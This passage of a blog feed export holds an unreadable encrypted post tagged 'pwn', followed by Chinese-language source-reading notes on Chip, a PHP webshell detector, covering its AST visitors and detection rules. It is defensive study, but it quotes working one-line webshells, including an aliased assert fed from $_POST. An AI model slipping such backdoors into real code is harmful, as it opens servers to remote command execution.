ea3662a52566d74c3330c279b91af8c559b177db408de4e52dfb1f72b3ca3d5880ec179df9fd7c1767fb4433b27207fbe79c04ef7645a5da6ca79409326a9af6ce2bd036b4a0edfda1a8574897185463b6f4e2d4c03a5a480aa3642a8c0c8308ccd96dab1592004d59dd407b301058eda4ace19bb37fc5d5d858ccd32ef9e5b3dbf33dcaadeae37b2929c991241bbdf4556028aa4b8e6fc8e91156131b1362c7ab669a1777dfe010330598802ec28b91f6249f50d09be6eb0487815cbd1b625faebaee2d4ba9b248ea2bbdc7a9cf34603b6f4494ce9fce0e5f48d5e7c8a230335896208f3cbbb9de491af74b90c7115946186bde3424e72b072806d1b172520f54b56aaaa8936a2f3ea5c7b4f5107860f492c86ffc8afd2f40d93b385a5178bd1b82fe6edcbaeae7b7a4b7d36aafd44d65073499f7e39f6fb5d064b179512e400420c0d5b70c85368f0e3d43ee43585d6615f164bb50d42dcf2bd20e106e72c31eeae55aa941f0d7c9e0415dd175a812afe334beb8c3b6915e8c4584d3dcf18bffae624a4d49d3f69f82f24ff4c20f54540f60cc992bde6d1965142875b9028783d49052bccef43c2f65c3290a38d8e01e2740ae1db0feb13df3ab2015b99e4586be2ad462c45e2b247b836dc8fdf32c75b5995a1ec69896fb18084a78e2bb4980bbe689296419759b5024f7ef4d4d775eabed17c38b807bc90a7def091622fef3c9d9a34168365e4da83665ccb8881871d6bb59b8976c07d74f887c6733b3331f11b856026542398e482cd14121765a1c64bceedb4a7ab7aae27fe4a18025d1f573483776106a18d155ee184f4c2876a3fd02766d69ec2536743a277864000b7424d1ba0ac257468813670e5dadce7aa9a88526a2774f82d99f1e013608400bae43ea7c7d1148d90c5bd3440d0a36b39cea952899da45514212bc159a355b5098a91efd376715f8635b1961a87082c2d201ff23fb742018f08f0e9754c9e5995f51cc252994e43b1bffc5e2e2ef561008b9332126121a595695b6321968ed6e789e6b4493ce81e11625fce8a6b2ba49f4787f21d9be5228d71a9b4c29a53bdf6f5e70e0e498cd9aa1137c9e24f21b139880564736966ac1e3e3bf89e98264e08eb8ade60c7cd68ed7f0f392a51c38fbf8be0877d245ea7b6cce15416db6ae1ab6269d8479177d9ae4d237a12f9f227f85d9fbd7268c7d5142e4972003e20d2fc69229e1b5482ba83d541eecfaff0186da0bcadbddd20575242dac57d3a565f66f90bdaa841f8b326e3f7bc4a250a39a75e5636813ca95502a83cbff943e129efbd0523eee709594aaf4b8f305b3454f3515f50fe4662daeb7fcbbb00258450e769688150e335641b6062012aba9d13a6154e3c5abc95a8ee1c0ff11dd0c6fcd324aada71fba878f13186d4ed61b9e09fcb1f1a13a241aae9565deb8ca2203aaf176b7171f04f46da9b0bc4d5aee13a7502b627fd13df2d17e12b5eaf20f6499a45dd39b43efadea35e553cc4cdbd92c219ecd9a8553ec4ebd32d3395440a1297bb4a81842a7724b53e44d4bf711924d3ca67246ae35b23e17cae30b6b3716f017a1cee2625d4657316aefb8cb4e86cfe7476b46dc91df1e11e9265af15b75e53241c89d2eb6fd837b48cac979a6ac18f000a1060a69af741cccc2b34b5fc13c62aa88c158d16452b76b9e8dda196447429c2628b01af7d6ea637b432122fb91f52b70872a897064a0debfab731adf3bdcf6450ee02d8ab8e5a6977d605c926b40ea6af201e412c1760f24a22b409b50013c69c413197877c020442cca6b5054069e213e9df3db10be39815e8a6a9fd7a701edeba34b0ebd33ca8102756147e96bce2aa408822e17ad56a1ad080bbc0ca3f7fa450639c855a74a2a8dd14deda434b665e4271b3eaecc72b106db3d02e099f71b14e2ddb59ea2fa10aef03e1c9a797a6244f5c84e26afa7383b2efc0cf0b50a7cca9b17b1d06d2c768d474e6f28b3b1cdd90cd482d0fde00a31e56be576cbb47f8bf081ce77315168de28ae9bec77fd1078d10960f67c5ee3e79a2a829764cfcfcb5dd972bcd3f8fddb0bb5d5c9efb20654af681300dab4cc51849e7fc2c683a6fc41821509bc6c5e14863a816b6e60b594ea09a5bfbdbcc16b427ea6ab2bd1281157e4570eccef5ef6e8495586d5d57236a606b6639368a887ff403137b484f4b7614689a3ea8c1fb9889767bffd18cec091d3237e046179f286c95c281116ee7ac821c9f245b488bb105847d514f7016ef44009220b647a39aded82ce51edfcbb3d980e2c98038f1f7bfef2a6ae0b892e1263141b04ee85f1e4232efb7fd356a9ff4788c27c886b81b70491d3011e85b512e7497ad44ae9c28377ff0ecb0dc3d115851c1482d18113e7602dfb647312a715f75aeeae5b7874b6d153bcfcf1cb2c36846818c2513e05b58ed9c007934a1a4d0969da7329c1b16e8295e1a426aa35b29eb4985a04842a8ccd74ad47f939a57318e2b4293941c6fa19aca666145b1d036c46c6a26850b68d8b2d35650d6acc920aa8069cd5626dd8efdbdf4e7a2318ab8e3fa71c7560d3fc667862131971c88c3c7bd41f83797c7e954c157b12f20a4eb0d9d6b28d1e4d0117dc7f09ae155afb1974b74547a20572826bf272eb6b017405c3252965a1986a0aef20129ac07d42b6d085320978484ddab53571e0726025dd3bb63db50bbcf9d2ba9c30ee17639ecebeb0b209af4278baaa0578b0969b644634de017943d005763a536602921c0a5f48d1f26cea96954475b109d60dbfbc2daed90918a1bedda03a4b201f56494ad3789041cf35be090a747b2a472f11c5b77fabb8177c9aabadb406f818aa04452e3946fa70b83d9d9d6abad061ad1758c7b308ba81811c333d3de6d79e0264d7f2a5c595b8e04ba6aa5017cd2f603e1b5280671f571bfb052ca4382e05610613459fd55ca283329c793f7de201d824c43cfa6628362aec28a3c76dbde70da044cb8dda6cae107a5f9ee859f7e29df6e95a8711ecc93458c0bd2bf9d6792c865b19f8763816b7f7cdd1ba56155ee86ac29982f0b9becaa95aead36bc4e482875aaf0f2df2904a0b2ba635c0d4afdad8720487dd358c046dcfa2025e52d64beee1d44f2cd0474d3dd5b0cfd0cb7da9df3eac0d405c57cbef54acfa243e60fe6744c0c7033fcc3bc4a0763809b2a8c6b654e14b02353c72ff530733573d96a50d0f4c32ad10b420fc90e59b8a6a51e9c73d82ae0867e37b57d2bde43642f318ba474aaac7e6e06f9c475833109cb58e5ed536b39ab80cf1af8e8c95cac986e92d120f8b85ff71ced4ebb67076bfbf209844db0d98ff3e86f3fd632902971bae7ced8d9a739c251fec1f33446d6500301baf037a2ed58d4deb8b8904df89a0c697be534584f19bf22930d67f61385c6692b4729f3aa0d3b7851ab724c8578b0a0f0cf5b49ed6098fa9e0d589a86c35cb197126a08eccf9555190061592556c359c1a43f7f57021c522bedb2b865401e566640dbc523fa32cd741661d8c119dcd89e91f15e089d984a9637602124f73033892ecaf30e76822a0c70f801ae6545955b73cd47405b2374aabae62ff8415563f99c9e354851806546f4e7d6169ab632ad3b756461ff72af15ef386e4d2a1f5ff766dc473f6274e209c065bd1717d729c64a57102b1e7eeea3b8de675fccc2fac5de1322e18402c312b294116910ee046fadfc70de148ee40da8b0e60a2d2ce118e47ae51d937f5b75d8093088b1795159b975cbc11f9172cac1036f68772a5fbd3a848a5c19e1198a876853e42adf77290505f82e518fc35e6cb059ed0101e89fcd24c37633499be3c00b03a4f478fea42b7dd671dd86eea81b7d56b0671faedf06a8fc11f711dfa3e553db1b3a3d767b30d1fce911972f836c8973bc9453e76a617b7eeec0686cf989869f142e9a41866a48dedc3e47bb3adfdfb0035596e73a9513f7d58b3a1458223af22e37bd251e4aa99bbe7990bb9f08c653a2dee1c28c01ec46ac8cb309df82f4f47ee804c0420f5b19b41c0c2059234f5a1edd436cdee3ee3cfc5e008541b76d74930255c67108f60bc42554316efc46281f04dd401c6b8d2de25afca48014c328c72f62f8cad1884e89c81bb46e9bffa420565993e47a7460af86a5b6cf4d0a8f44c7704bdfec3444d70f33ff929e88585864f92b73c4022ab8337eee43b471bf75341175919670a7a10ab364aa9a4d46b83de4f41ac374fb865f127b03b267929a7c86663c49a223804ef41b90f69f22742434cde82ade59aa2b08c116602f56834ef2df4190702af66457b363224a9e9899b4a842aa469ec11d7aaaed479c28ba4542357c7a6c8e31bb23aa6c7d23b5569c3af7c1370b85b04463f7811d81246b6dbaced47aacd123e659243eb6d5c213facb6e36b6de3cd18ef2236d30997d1b98da276f34d148e5e68ac8d6ec0d2d48e6f7fb87373a753e78c0652e0ccbfe1ca691b5b7500badab37822608f1b1d8de9fdf99d3c8b8613d06b5a8896ad3781b53dd2b2e4b1d8edd8f0fca7b7e113eb70afa5b89dd84ca4e6016ecfab2a992f96967f4e1d7159e476a8001ae857f62491f586db4c57c9cad4717c141c29644773a616368b97406de25be345a37f816f8d5f792ea9dfc0b13baed6e10546c94fc416fe8c30ad78c9e74f1c7bcd0354f362374e0c200e05f696d0cf352897729e5a4c5367e16afe693f47825773bb2cf04cf83599275bff24cbecc27734c398e4292a9731cf74a7a6efcb1b1532b96d96e130356a7296233013737b31e3d20b31dddbcce83b373b1978169eb587a32f3ce28ca0efad022134e01153e070b0ea5238ae7e95e6c8ec026644d11b9646e381adced09ad93982e0312f8033894a2bfd2786b4be703795ea3d99c19b473012a1262909d3c93b928ef1e392f693a934bea06ff7443a66502b2eab7ff95db6aa14af8c9cb60e54f419825a37c7bc6b11cd0479c6d643854654e945d90c51aede5501a6e33086245bc58aaf12c9925e21a806e2063e0417ccf8b6e09a2010a9f4a5a4171afd69296ed44579364ae62363007307c80ad8c8d045a40147d1983b7af584e9b0110609c8a3f573c76f9b32295a68155996c72b794e0af07412d9a41b12577286c85bbeb7ac09ad440fe5c8f24edb205298432ecdcfb43118e7e7c1fd327cb414d17322f242cd7aeb550ab043650b477208c5756c1ac737c9fc8c6b2015e5359a4f89b9440751d6c0ee477d54e6ee35617c7174aaef93c6b8f32b127fbc160e66fd56c8fd5a846f87c9a5c7ec167894ac6b7219bc2aa2a9077c83ebe001cfe0564ef0e9956be2a3067743322601b1374bafbf8d1ff5c39cf401b5eab4464c37d63bf8030fb70b6f02457e7d031e07d2f1f1b2d929e984635d3b9ccaa993afcef20d868a461fa35245b7a5c13bc7f2b8bfbf0276d94a15d39b9e6b54eda17a4d9550b5058a7ce85b3b2a2f50366ce50689afc46b140db337587b6dca3251bbfbaf56a3bd0d0d159fad67b204ef7e47bf488d157a9024b18a38faebc549acb62110c12c2a0c0a59ed523d468b3c78897033bf106e3a718a02909249c8fc8e43522c1322acb52bbb3f93f8319b63879eb22cd2a739f7935aabec518ae72b44a15d497e8c46857e9e697a9e17a644bb6fad6430b4efd2cc9e1a9d1e756309dc3dfd0c408706585e5c7f4caef2697ea2ed47244e679cc5c6a8ec150d5e69d5fb3a671a62ba4b93421c35c0016b32c44576e17efac5d97d614d9eb599c26b93c2be872f478aaca97f5cc7e8bd26732f25133d7642bc3590d0129f4dcc1c7edd9e1045e75726e780351bd0abc6e2c3b1f882dd66a5fdd77793feb1bf21b0851b2f28ce0e44fdc53908cc5fbc6174f79b49b7e7e538a5e932faa5a0b186722c4ed247e234aa7d203323237a3f2788f721c17f0229471d60ac25c0ef4ac1ff6b7e16ca3600e2cc97c0505ab33e683cb90586f220c1e10ee764afab1cf46c8612de5be0a88d23b4dd35065cbab68fc25683ae555ac936df4f8533fa7f4458d780ba0ec2743ab859596078524cad8bf6ae98b686f96e966cdbb510b6461d53ebaa9da98f7ca7bcef185525c1b23deae53545b4a2d8580ec83c8d00753820b086228fbe77146167239cb323a5613b9bb695259136ab307905bfb48da565e82b2992e7419849ea7490c0a3f9f38fc20e2d343948cb9697d893b2beaabb7402de35193e44ac179e7e0841eaebd71a272fc039ed406b606e55b200cc78d37f0427f322f32876e744edafcae3379460b782d00fb1394c3474139faf2302a893b296f7f4900f9a6645235f233e866aa852dfabfe0c99b597d84b1addae1eba13a6ea3cabef291a9c44d013cc27b41bfb08d2353df1789a5142c8d1010514b642d8462a9beaf8161f81cb183382985f46b7d2173afcd74f5b053fe72b17d96789b0b5e1d52a3c3d78b9646ee6e94f314f175034cfd7ceceec151248e5e2379d7d34515a6018336b32c2d8545a95cc81e77eb109789f8e7687e7ef4adc00a0b432dd1e89faca600f3b532275aeb080b38a68e8ee04eae7238ff323d6a05364a87eca377bd9862e7dfc96b763db9d90355f9cb3f466afba6f9d094b2490c2742813ce2d343482c001947a36e77c7dca0149ba56f3564fc831f73fd0d2df41380ab37f8b417e633f00e2d7eff9d45c6e7ad7e9b897ad4ec578d6e8723b4c5e7a2f510b2c047e74e7e696e18cbcc7047563576be95aa72d8a2805a7b81a5e812f09cdfa0facd5a97109eba92e86c915c2596d962d3d102a08918a9dfe7f32599d86226846c88065feae45d3f7f1ef8c1496dfa6114509fc44ad0acd414ac2cb445ecb31a2d98aa06c0777cadb0efc465a79344ba0eb299c5f965cb541248795c6e7d78feec7dbf096fac4cb0d3337cb2863da76954dd82199dd59a999a1d1f8d59e0b7849259b85a0c1eea74680e81e768f59d19c91cd0e05270fd32b8b1dd8965a97f5d06c095beb0f7f4f2bc68e7688a2f96eb791025c975e15ecffd8b2123e41cbb27ef57cdfc8d871b14c46d3d1f3216efadf5171e8f96d9327f5552f42ead231b023b703e0cbb34e6b9a30a5290c44e7b5cd4de07ab9351c2648c1ee838df792ccfd0888901be8b4fca879659341be6685041b0d34b8525e5654dce41df473f847b8db0167ac2120432bce2ac49171221c4362ae99d0f0db0a448f8067c1c75132173279e5098721ad8693dd8d07e512bddc462a60b30eb0c394c0d31b237cc709a8b1966745dd56f4e1aa1529900788c6978b8dcbbde7aa1eb05719ef6cadbeccf37788353a9cfdf39dedd28e350e8be1ed6b73d4da814452d140e740f79a582f6ece6e9bdcc8dca145591818d0e78d47f0541db6186dafb83c4a42fadc6ac9afa1c689b9b29367dff5740c692f1c14228109033478783cfac2aa7bfa717c5112ebf20a7b0417be291acb463c3e16c642a36f2cff4cc1bcf7aa54628bda6053436927780690f6ef23bba41af3bcbdf56cd58019f1f7384bf63c8b3bf8010ef1a8469c9e7d9c8c5c62d761f7b992a8dabd3ba1ee489b4a6cde74096cc0836e5501d5af36bc4bfe6140c34eb2c2b076f80c4b336836310b2b4f30c1fda1126ac4798a54d1740676042b5640ad9fa1df8b4912868c8caeb5e130ae17905c47f82266734a7026468840a470834c1c9838bdacbb7591620613873ef58c2d7ba44f5b3ffa6ac3e619f84d9b1b9ed050457358a930048b97a88bcd698386fbf9764f49b80f67397ece9df11160e4f3aa5923d3c02d8753b570a1b4f25d85e6a10a532e73eee846e45d501ae4e547ba806ba9f1093e7fba36c385d379b730f2a0e6351ac78308f6e598fb2bf53699e69af6b4d28075371012edde862fb0ba4a079c221cc3f6947002facf0dc9587c91dad6b42846babccd08c6e00dd5e8f16360a267d06057a9b5815b79fbec2f101176a5d09aa2a33c13965a9a32de07771ac1d39e905bc0fbab381bf532f2a85ed1159c728d2de30fd651237f39f901702435aa97afaa6da0d3a2159817c577f6ac29c349dcd5c45368688e5469a8848c1aa7b07de3b83139fab93b079ef0ad1e86fc7b490e72945a2ae8f7b4a8a5d01ecae8b0cc6c541db4a8f6c2c32ff2393c7763d8803327920f960036d5b2af327f86e51a77ee39b832c2a8e2f59d616e69d8dd76928323168fe00e08ac4bfd7ae7dd290cc11de5d3b32a4c4d9e6c585e7b74811025ac8a508e9862a9ce34943e71f3392d00717f9669e580800657b25ea1c8790655b59d2e1160243179ca67a6bec365ab26bbb693017d79ce2d403c7defd22a37de4b834ada017ea26da7c1c21a82066a5c0a47b0af873646d529946e3e3fc9017328389c11cc558b65e82fff1c616eef1a38dfee9a0d7100d4ffb32635c7fba3baf36d312f1eeb4dbc3e5b726ec20196d2d279f44d81f492af4b64966dd6d5d88f3d872618c72e5169d258df22b7cde345d5c6d895df7b38e9420b59cc1787c55bf4eae404631ba40b5bcc8825ab66abd6c2cb0dcdbc65009b8d6d5bc3eb1c8eb48b5b5606b36901eac274db325fb8694ab0f79e3a91c6442534067fe05cd504bbc4303f48bb3677fa410c31de77437907d310c67362806a514e57de1c7e0bec718f4b7a6fbd2634a1192aa2efc29c0967eb4aff668bde2e46f1a4baea53bd99868f67abb00a536adaa562f7e345327482cfd54138ece1775decf1b2b7afb963cf09ff5fa4307e3dcc0246fb04ed7b5e0acae060b6cc45764458702a1bb5ad82b6f18260031d579bab784cb5d4770e6d1739710f7cad15cae191555914a5a73b69ce8274e38c5677d3a7c6c72edab6b41b173fe5330fe54aa889e1ce7b1e528419029ebae1a80b3ca9266bc12e833bf6eab3d81cbd88059d25df295ccda8893df261974aa9ca666dbaf69e17b99c29bb2afbcf88e563212c3fee6f2ffc8d1cd9e33139255efc346d3a4ac4572b12a8a2aade8fa89b049f12d80005373f353c46276b20ecb6f650e9d71f9e33df689e39973dc8d116a65d075fe051da7e03e6ca74b727e562b233d54b3c4061039fa186c18c769cd12ecdb45c542b343c9cf0ff64ba9a5d49656650e60fbca55e8f1ade979d3eaf53389e8a6f25ce324b4e76c1ee8d4f77a4666299cdce87c95792f12377da2ba2ab87617c510a7cfe6318cc960ae3881acf0ef5f6bd7014ad44e645910c99ff8b41b32566808d67bcc3de2597389de0843edf308ab4da721ea20513312d6b6ee2da2db1ea86daf3c879957fb28695b02c42584fe639c61f2454b1855189b2134298b36ebae1f423f782a03b0792983dd410d2d13fef4c05844b399a40d9f30fb68ed916fcf19c9b87f397d3750f9adadf822ed84171b488f36b0730afdf14c215fc557734fc33ef91566afd9ed3f473fb2ff5309d49cbdae1f03d9ae42f9173280088643bc091afd1ae126edbeba142472de49d9902599321c46ccc50559da3950e907619dcac5b5aeb2c10cddb816ccbe7b7368b5c43e59cf900bf52baa2d974b083b510daee288460d195b3f06e54a3c4088c1578407a6528cd74f13df9a108235c757cfa89c8011ad1f9bd501f98a913f3a11bfb54b95620c2a6b1ff7fb6bccbcae16b37284b6f0c48f4107f3774d2f4be10487eedd80f7b211b170df39104162ac0ab15c661bc2bccfab8af21df83756114020f8dc88a49c8ea1ce44dc64a64f6ae1d9aea0536a34de2be8b3b683d077d21c03003bef28eb99698b69c3a0645cc9f0f8b542a9d366b0a3892caa23cc91f3a6f9f1db675fe422ea50667007a4c645f3c4dc4fa9bd1c74373659a9c82f5da97001aad2723dd452d9e8d837dbb549f167cd1cf3ad8167a369544ca9363c566752085945b09ac4ebbacbbf9cc2a30606ee34561575caa2abcc1a5010d575ec11dd7aceb1447b2c21b8aedd911b22c8a5b1008a9fd3e</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Chip代码阅读笔记</title>
    <url>/2020/04/17/chip%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>记录自己阅读Chip源码</p>
<a id="more"></a>

<h1 id="0X00-思维导图"><a href="#0X00-思维导图" class="headerlink" title="0X00 思维导图"></a>0X00 思维导图</h1><p><img src="/2020/04/17/chip%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20200418212831298.png" alt="image-20200418212831298"></p>
<p><img src="/2020/04/17/chip%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20200418123816033.png" alt="image-20200418123816033"></p>
<h1 id="0x01-CHIP-整体检测方法"><a href="#0x01-CHIP-整体检测方法" class="headerlink" title="0x01 CHIP 整体检测方法"></a>0x01 CHIP 整体检测方法</h1><p>通过阅读CHIP源码，可以看出开发者分别将<strong>普通eval/assert代码、正则/e模式代码执行（如：preg_match函数）、create_function代码执行、系统命令执行、动态函数调用（如：$a($b)）、回调后门（如call_user_func函数）、畸形/加密一句话木马（如base64编码）、任意文件包含（如：include函数）、PHP反射（如：ReflectionClass类）和执行不安全的继承与重命名利用（如：将eval函数起别名）</strong>这些动态特性的形式总结出来，然后得到各类型的特征，在语法分析的层面上对php动态特性进行捕获，利用已有的PHP-Parser包来将PHP转换成AST语法树，结合每个类型的特征设置相应的Visitor去遍历AST的每个节点，遇到有符合相应特征的节点就输出报警信息，直到所有Visitor遍历完AST后结束。</p>
<h1 id="0x02-入口文件"><a href="#0x02-入口文件" class="headerlink" title="0x02 入口文件"></a>0x02 入口文件</h1><p>/bin/chip，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (PHP_SAPI !== <span class="string">'cli'</span> &amp;&amp; PHP_SAPI !== <span class="string">'phpdbg'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Warning: Chip should be invoked via the CLI version of PHP, not the '</span>.PHP_SAPI.<span class="string">' SAPI'</span>.PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/../vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Console</span>\<span class="title">Application</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $application = <span class="keyword">new</span> Application(<span class="string">'Chip'</span>, <span class="string">'1.3.0'</span>);</span><br><span class="line">    $application-&gt;addCommands([</span><br><span class="line">        <span class="keyword">new</span> \Chip\Console\Check()</span><br><span class="line">    ]);</span><br><span class="line">    $application-&gt;run();</span><br><span class="line">&#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>这里采用了phar用来打包项目，在本地测试将chip打包时需要将bin和src拷贝到项目根路径中，然后运行如下php脚本。即可将chip打包成chip.phar。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir = <span class="keyword">__DIR__</span>; <span class="comment">// 需要打包的目录</span></span><br><span class="line">$file = <span class="string">'chip.phar'</span>; <span class="comment">// 包的名称, 注意它不仅仅是一个文件名, 在stub中也会作为入口前缀</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="keyword">__DIR__</span> . <span class="string">'/'</span> . $file, FilesystemIterator::CURRENT_AS_FILEINFO | FilesystemIterator::KEY_AS_FILENAME, $file);</span><br><span class="line"><span class="comment">// 开始打包</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;buildFromDirectory($dir);</span><br><span class="line">$phar-&gt;delete(<span class="string">'build1.php'</span>);</span><br><span class="line"><span class="comment">// 设置入口</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php</span></span><br><span class="line"><span class="string">Phar::mapPhar('&#123;$file&#125;');</span></span><br><span class="line"><span class="string">require 'phar://&#123;$file&#125;/bin/chip';</span></span><br><span class="line"><span class="string">__HALT_COMPILER();</span></span><br><span class="line"><span class="string">?&gt;"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="comment">// 打包完成</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Finished &#123;$file&#125;\n"</span>;</span><br></pre></td></tr></table></figure>

<h1 id="0x03-代码流程"><a href="#0x03-代码流程" class="headerlink" title="0x03 代码流程"></a>0x03 代码流程</h1><p>简写的函数调用栈</p>
<ol>
<li><p><code>new  Application()</code></p>
</li>
<li><p><code>application-&gt;addCommands([new \Chip\Console\Check])</code>      加入 -r  -l  等参数</p>
</li>
<li><p><code>application-&gt;run()</code>    </p>
<ol>
<li><p><code>application-&gt;doRun()</code></p>
<ol>
<li><p><code>application-&gt;doRunCommand()</code></p>
<ol>
<li><p><code>command-&gt;run()</code></p>
<ol>
<li><p><code>command-&gt;execute()</code>      ===     <code>check-&gt;execute()</code></p>
<ol>
<li><p><code>check-&gt;checkCode()</code></p>
<ol>
<li><p><code>ChipFactory-&gt;create-&gt;detect()</code>   ===  <code>ChipManager-&gt;detect()</code>  添加visitor</p>
<ol>
<li><code>chip-&gt;feed()</code>      扫描代码   traverser<ol>
<li><code>chip-&gt;feed()-&gt;alarm()</code>   获取输出结果</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>chip先读取输入的php代码，然后利用PHP-Parser将php代码转换成AST抽象语法树，然后通过添加Visitors来遍历AST树，分别去检测webshell。</p>
<p>visitor 分三类</p>
<ul>
<li><p>NameResolver     parser内置的Visitor，在chip中是遍历AST的第一个Visitor，在看到有用use给函数别名时，将别名和函数原名保存，之后再遍历到有FuncCall节点时，检查FuncCall的name，若为之前保存的别名，然后修改当前节点。<strong>这里只针对use别名webshell而言，NameResolver还有其他功能。</strong></p>
<p>用于检测</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">function</span> <span class="title">assert</span> <span class="title">as</span> <span class="title">test</span>;</span><br><span class="line">test($_POST[<span class="number">2333</span>]);</span><br></pre></td></tr></table></figure>

<p>这类webshell。</p>
</li>
<li><p>CallstackVisitor    定义一个栈，入节点时如果节点为Node\Stmt\Function_ 或Node\Stmt\ClassMethod 压栈，离开节点时，若栈非空且栈顶为当前的节点，将该节点弹出栈。</p>
</li>
<li><p>Visitor文件夹下   均继承BaseVisitor，beforeProcess()分三类，在入节点先检测当前节点是否是checkNodeClass，若是则调用process()函数。下图为BaseVisitor.php。</p>
<p><img src="/2020/04/17/chip%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20200418214141523.png" alt="image-20200418214141523"></p>
<ul>
<li><p>Assert:   checkNodeClass为<code>FuncCall</code>  ，调用FunctionWalker中的beforeProcess() ,调用getFunctionname(),若函数名为assert,进行process() ,然后调用hasDynamicExpr()检测<code>$node-&gt;args[0]-&gt;value</code>,分别用hasVariable()和hasFunctionCall()检测<code>$node-&gt;args[0]-&gt;value</code>节点，是否为如下类型节点，是就critical，否则warning。<strong>同Eval(EvalNode)  Shell  ShellFunction</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  hasVariable()</span><br><span class="line">  Node\Expr\Variable    		变量 </span><br><span class="line">  Node\Expr\PropertyFetch     </span><br><span class="line">  Node\Expr\ConstFetch 		</span><br><span class="line">  Node\Expr\ClassConstFetch  	</span><br><span class="line">  </span><br><span class="line">  hasFunctionCall()</span><br><span class="line">  Node\Expr\MethodCall  		</span><br><span class="line">  Node\Expr\FuncCall</span><br><span class="line">  Node\Expr\New_</span><br><span class="line">Node\Expr\StaticCall</span><br></pre></td></tr></table></figure>
</li>
<li><p>Callback: CheckNodeClass为FuncCall，在Chip/Schema/FunctionWithCallable.php中定义了FUNCTION_WITH_CALLABLE常量，保存带有回调参数的函数，在Callback的构造函数中将下图中的函数<img src="/2020/04/17/chip%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20200414171244310.png" alt="image-20200414171244310"></p>
<p>保存到$this-&gt;functionWithCallback二维数组中，键为函数名，值为对应的回调参数的位置。调用FunctionWalker中的beforeProcess() ，然后获取函数名，判断在不在$this-&gt;functionWithCallback中，若在，调用process()函数,先遍历$node-&gt;args，如果有有使用<code>&lt;?php usort(...$_GET);?&gt;</code>这种参数，报danger。然后检查对应pos位置是否是回调参数位置，然后判断$node-&gt;args[pos]-&gt;value instanceof Node\Expr\Closure ，是就跳过，否则调用hasDynamicExpr()函数检测$node-&gt;args[pos]-&gt;value,若返回真则报danger，返回假则调用isSafeCallback($node-&gt;args[pos])，如果$node-&gt;args[pos]-&gt;value是string而且函数名满足<code>/^\\\\?[a-z0-9_]+$/is</code>且函数名不在DANGER_FUNCTION常量数组中，报info,否则报warning.</p>
</li>
<li><p>CreateFunction: CheckNodeClass为FuncCall，调用FunctionWalker中的beforeProcess() ,调用getFunctionname(),若函数名为create_function,进行process() ,首先调用hasUnpackBefore()函数检测$node-&gt;args[$i]-&gt;unpack是否为true,若为true，报critical，然后调用hasDynamicExpr()函数检测$node-&gt;args[$i]-&gt;value,若返回真，报critical,否则报warning。</p>
</li>
<li><p>DynamicCall: CheckNodeClass为FuncCall,进行process() ,若hasDynamicExpr($node-&gt;name)为真，报danger，如果isName($node-&gt;name)为假，报waring。 <strong>个人认为这里误报率较高，</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &lt;?php</span><br><span class="line">  $a &#x3D; 1;</span><br><span class="line">  eval($a());&#x2F;&#x2F;只要是（）就报danger</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>DynamicMethod: CheckNodeClass为MethodCall,进行process() ,若hasDynamicExpr($node-&gt;name)为真，报danger，如果isName($node-&gt;name)为假，报waring。</p>
</li>
<li><p>DynamicNew: CheckNodeClass为New_,进行process()中检测hasVariable($node-&gt;class),返回是报waring。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &lt;?php</span><br><span class="line">  $a &#x3D; new $class;   &#x2F;&#x2F;没理解这样有什么危险</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>DynamicStaticMethod: CheckNodeClass为StaticCall,进行process() ,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">($node)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $class = $node-&gt;class;</span><br><span class="line">        $name = $node-&gt;name;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasDynamicExpr($class)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;storage-&gt;danger($node, <span class="keyword">__CLASS__</span>, <span class="string">'以动态类形式调用静态方法，可能存在远程代码执行的隐患'</span>);</span><br><span class="line">            <span 